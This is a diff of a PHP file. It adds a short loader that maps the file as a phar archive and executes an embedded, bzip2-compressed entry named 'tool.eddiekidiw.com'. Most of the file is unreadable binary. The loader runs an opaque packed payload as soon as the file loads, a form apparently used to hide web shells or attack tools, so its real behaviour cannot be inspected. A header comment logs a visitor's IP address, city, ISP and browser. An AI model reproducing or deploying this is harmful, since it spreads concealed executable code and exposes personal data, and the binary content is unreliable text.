@@ -1,4 +1,15 @@
-<?php P             ÿ¿.phar       tool.eddiekidiw.comM±  úRpa¬  uæ€¤!      BZh41AY&SYãeþ ²ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿàmŽó½Þë¾ûÏ_Mõß}ñäúív_KkyÞ·v÷½»©ºµEÝÞî÷\÷·'³ê¯lû{îð:ß@÷{Žô¾ï¾n÷{Û¶};=÷w{.û»eµ»½ß
+<?php
+/***
+Date		:	2021-10-21 Thursday 00:33:44
+Ipaddress		:	180.241.241.152
+City		:	Pekanbaru
+Country		:	ID
+Region		:	Riau
+Organization		:	PT TELKOM INDONESIA
+User-Agent		:	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+***/
+if(!class_exists('Phar')){exit('please install php-phar');}Phar::mapPhar();require_once'phar://'.__FILE__.'/tool.eddiekidiw.com';__HALT_COMPILER(); 
+P             ÿ¿.phar       tool.eddiekidiw.comM±  úRpa¬  uæ€¤!      BZh41AY&SYãeþ ²ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿàmŽó½Þë¾ûÏ_Mõß}ñäúív_KkyÞ·v÷½»©ºµEÝÞî÷\÷·'³ê¯lû{îð:ß@÷{Žô¾ï¾n÷{Û¶};=÷w{.û»eµ»½ß
 î÷Ýëïi³—£Þ½÷Ýé­jsîîZæîsÏ9¯oWyî;ž6Ûs¼óÝ½îïqó×‹ï{vÙyæóŸ[ºï}÷¾7ÞçÝÚóç|Ð­÷‹nv]Û·Ý{·}ÞûsÎêºõç¹¯nö÷¶×¯{î}ÞïkÍÎx÷}ÝÝÇÏ=÷kÝÏ{ËcyÙÏ}jè_vVïŸy»çÛß-¹šrvï3[\­÷u÷[ÞÊ]½öûî^Ïw^ßm§ºûçÚï¶óîÎ¾÷tµ·ÍîóÛ×¾ûß{ÞÓ¯<Ï¾öîíØ÷ÑÕõÎ­nö}î=«²—¾½ô÷Îû6¼÷«ÇŸ}à}÷ºº×ÝŸ[nûj¼éß}ï¾]{}ïwn7='ß:ù’×ß}êêÚ˜ta4Í& OÁ2`0  À  ˜ 	‰€˜)á0 L 
 2`C š` h 4
 4CU¦` LÐi„À 	„À˜À)²`& 	€ M2` &Ñ2`Ð4€Ði¡¦š0FÄÂ`Hd‰“‰¦M0Li6‰„4ÈÀdÃB`
@@ -343,4 +354,4 @@ WÐ¤ÍˆŒÇ†ù™Rÿ(”ÑŸ4ßuF
 Ó¤HOSr°úÊJ'át@ÿK] ùEAÑ–.´ƒt}ÿw¹|Ê@-¦Kë	‡fñy¤’­œ'Ýe,o.›£”Ò9OhÓyzŠ}(Ëˆ·¸)àÁöÜ¿µhoÐÒöÁx¸]Fš9¶ÿ6ôŽ_>,¯›+Jí&É³ZãsíÿhošÜ
 7–¨.0>ZÜÞ¶¯Lg_ëç ‘jòÌèéÍ€¤¯\ÎAlðIù[1ŒÛˆ9ÿ ­ÈEìä" 7¡Hÿ^0é+?Žx:>=boC)bÌÁT‰p”ì1ß‡÷–¤„åÈ–=5­ÿúŒˆøCÈ„ßùÄ›ª¥<¯§V}
 A‡ú¹Åí’ª¦¾J|]õ~²ØŠŠ‚A¨kŸŸe!ýÇÅ»€ŠÍ÷{0œÂ/tÒà	ñÙlg£±êF~Ò!.>Ò‹µæ·Ö“ °ÝX—™½tÿâîH§
-l¿Â@¦.nQNîÿ.­(GœO   GBMB 
+l¿Â@¦.nQNîÿ.­(GœO   GBMB
